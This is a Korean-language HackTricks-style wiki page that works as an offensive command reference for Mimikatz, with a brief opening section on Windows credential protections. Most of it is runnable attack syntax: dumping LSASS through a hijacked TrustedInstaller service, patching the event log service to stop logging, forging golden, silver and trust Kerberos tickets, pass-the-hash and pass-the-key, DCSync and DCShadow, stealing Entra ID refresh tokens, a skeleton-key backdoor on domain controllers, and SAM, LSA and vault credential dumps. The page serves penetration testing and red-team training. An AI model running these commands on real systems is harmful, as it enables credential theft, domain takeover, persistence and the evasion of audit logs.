# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**이 페이지는 [adsecurity.org](https://adsecurity.org/?page_id=1821)의 내용을 기반으로 합니다**. 자세한 내용은 원문을 확인하세요!<sup>[[3]](#references)</sup>

## 메모리 내 LM 및 Clear-Text

Windows 8.1 및 Windows Server 2012 R2부터 credential theft를 방지하기 위한 중요한 조치가 구현되었습니다:

- **LM hashes 및 plain-text passwords**는 security 강화를 위해 더 이상 메모리에 저장되지 않습니다. Digest Authentication을 비활성화하여 LSASS에 "clear-text" passwords가 cached되지 않도록 하려면 특정 registry setting인 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_을 DWORD 값 `0`으로 설정해야 합니다.

- **LSA Protection**은 무단 memory reading 및 code injection으로부터 Local Security Authority (LSA) process를 보호하기 위해 도입되었습니다. 이는 LSASS를 protected process로 표시하여 수행됩니다. LSA Protection 활성화 방법은 다음과 같습니다:
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_의 registry를 수정하여 `RunAsPPL`을 `dword:00000001`로 설정합니다.
2. 관리되는 devices 전체에 이 registry 변경을 적용하는 Group Policy Object (GPO)를 구현합니다.

이러한 protections에도 불구하고 Mimikatz와 같은 tools는 특정 drivers를 사용하여 LSA Protection을 우회할 수 있지만, 이러한 동작은 event logs에 기록될 가능성이 높습니다.

Modern workstations에서는 **Credential Guard가 많은 Windows 11 22H2+ 및 Windows Server 2025 domain-joined, non-DC systems에서 기본적으로 enabled**되어 있고, **LSASS-as-PPL은 새로 설치한 Windows 11 22H2+에서 기본적으로 enabled**되어 있기 때문에 이 문제가 더욱 중요합니다. 실제로 이는 `sekurlsa::logonpasswords`가 예전 tradecraft에서 기대하던 것보다 적은 material만 반환하는 경우가 많으며, operators가 점점 **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)** 또는 **CloudAP/PRT-oriented modules**로 pivot한다는 것을 의미합니다. Protection 측면은 [Windows credentials protections](credentials-protections.md)를 확인하세요.

### SeDebugPrivilege Removal에 대응하기

Administrators는 일반적으로 SeDebugPrivilege를 보유하며, 이를 통해 programs를 debug할 수 있습니다. 이 privilege는 무단 memory dumps를 방지하기 위해 제한될 수 있으며, memory에서 credentials를 extract하기 위해 attackers가 자주 사용하는 technique입니다. 그러나 이 privilege가 제거된 경우에도 TrustedInstaller account는 customized service configuration을 사용하여 memory dumps를 수행할 수 있습니다:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
이를 통해 `lsass.exe` 메모리를 파일로 덤프할 수 있으며, 이후 다른 시스템에서 이를 분석하여 credentials를 추출할 수 있습니다:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Mimikatz에서 Event log tampering은 두 가지 주요 작업으로 구성됩니다. Event log를 지우고, 새로운 event의 logging을 방지하도록 Event service를 patch하는 것입니다. 다음은 이러한 작업을 수행하는 명령입니다.

#### Clearing Event Logs

- **Command**: 이 작업은 event log를 삭제하여 malicious activity를 추적하기 어렵게 만드는 것을 목표로 합니다.
- Mimikatz는 표준 documentation에서 command line을 통해 event log를 직접 삭제하는 명령을 제공하지 않습니다. 그러나 event log manipulation은 일반적으로 Mimikatz 외부의 system tools 또는 scripts를 사용하여 특정 log를 지우는 방식으로 수행됩니다(예: PowerShell 또는 Windows Event Viewer 사용).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- 이 experimental command는 Event Logging Service의 동작을 수정하여 새로운 event가 기록되지 않도록 설계되었습니다.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` command는 Mimikatz가 system services를 수정하는 데 필요한 privileges로 동작하도록 합니다.
- 이후 `event::drop` command가 Event Logging service를 patch합니다.

### Kerberos Ticket Attacks

빠르게 syntax를 확인하려면 아래 commands를 사용하세요. [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md)의 전용 pages에는 최신 AES/PAC/opsec 관련 세부 사항이 포함되어 있습니다.

### Golden Ticket Creation

Golden Ticket은 domain-wide access impersonation을 가능하게 합니다. 주요 command와 parameters는 다음과 같습니다.

- Command: `kerberos::golden`
- Parameters:
- `/domain`: domain name입니다.
- `/sid`: domain의 Security Identifier (SID)입니다.
- `/user`: impersonate할 username입니다.
- `/krbtgt`: domain KDC service account의 NTLM hash입니다.
- `/ptt`: ticket을 memory에 직접 inject합니다.
- `/ticket`: 나중에 사용할 수 있도록 ticket을 저장합니다.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Ticket은 특정 services에 대한 access를 부여합니다. 주요 command 및 parameters:

- Command: Golden Ticket과 유사하지만 특정 services를 대상으로 합니다.
- Parameters:
- `/service`: 대상으로 지정할 service (예: cifs, http).
- 기타 parameters는 Golden Ticket과 유사합니다.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket 생성

Trust Ticket은 trust relationship을 활용하여 도메인 간 리소스에 접근하는 데 사용됩니다. 주요 command 및 parameters:

- Command: Golden Ticket과 유사하지만 trust relationship에 사용됩니다.
- Parameters:
- `/target`: 대상 도메인의 FQDN입니다.
- `/rc4`: trust account의 NTLM hash입니다.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- 현재 user session의 모든 Kerberos ticket를 나열합니다.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- cache file에서 Kerberos ticket를 주입합니다.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- 다른 session에서 Kerberos ticket를 사용할 수 있도록 합니다.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- session에서 모든 Kerberos ticket를 삭제합니다.
- 충돌을 방지하기 위해 ticket manipulation commands를 사용하기 전에 유용합니다.

### Over-Pass-the-Hash / Pass-the-Key

`RC4`가 비활성화되어 있거나 신뢰할 수 없는 경우, Mimikatz는 NT hash만 사용하는 대신 **AES128/AES256 Kerberos keys**를 현재 logon session에 patch할 수 있습니다. 이는 `sekurlsa::pth`를 NTLM 전용으로 취급하는 것보다 modern domain에 일반적으로 더 적합합니다.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate`는 새 콘솔을 생성하는 대신 현재 프로세스를 재사용하므로, 동일한 context에서 `lsadump::dcsync`와 같은 명령을 즉시 실행하려는 경우 유용합니다.

### Active Directory 변조

- **DCShadow**: AD object 조작을 위해 일시적으로 machine이 DC로 동작하도록 합니다. [DCShadow](../active-directory-methodology/dcshadow.md)를 참조하세요.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: password data를 요청하기 위해 DC를 모방합니다. [DCSync](../active-directory-methodology/dcsync.md)를 참조하세요.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: LSA에서 credentials를 추출합니다.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: computer account의 password data를 사용하여 DC를 impersonate합니다.

- _원래 context에는 NetSync에 대한 특정 명령이 제공되지 않았습니다._

- **LSADUMP::SAM**: 로컬 SAM database에 액세스합니다.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: registry에 저장된 secrets를 decrypt합니다.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: user에 대한 새 NTLM hash를 설정합니다.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: trust authentication 정보를 가져옵니다.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

**Entra ID** 또는 **hybrid-joined** host에서는 `sekurlsa::cloudap`을 사용하여 LSASS에서 cached **Primary Refresh Token (PRT)** material을 노출할 수 있습니다. 연결된 Proof-of-Possession key가 software-protected인 경우, `dpapi::cloudapkd`를 사용하여 후속 **Pass-the-PRT** workflow에 필요한 clear/derived key material을 도출할 수 있습니다.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
TPM-backed 키인 경우 훨씬 더 어려워지지만, hybrid endpoint에서는 확인해 볼 가치가 있습니다. 캐시된 CloudAP 데이터가 기존 `wdigest` 출력보다 더 흥미로울 수 있기 때문입니다.<sup>[[2]](#references)</sup> cloud-side abuse chain은 [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html)를 참조하세요.

### 기타

- **MISC::Skeleton**: DC의 LSASS에 backdoor를 삽입합니다.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: backup 권한을 획득합니다.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: debug 권한을 획득합니다.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: 로그인한 사용자의 credentials를 표시합니다.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: 메모리에서 Kerberos tickets를 추출합니다.
- `mimikatz "sekurlsa::tickets /export" exit`

### SID 및 Token 조작

- **SID::add/modify**: SID 및 SIDHistory를 변경합니다.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _원래 context에는 modify를 위한 specific command가 없습니다._

- **TOKEN::Elevate**: tokens를 impersonate합니다.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: 여러 RDP sessions를 허용합니다.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP sessions를 나열합니다.
- _원래 context에는 TS::Sessions에 대한 specific command가 제공되지 않았습니다._

### Vault

- Windows Vault에서 passwords를 추출합니다.
- `mimikatz "vault::cred /patch" exit`


## References

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
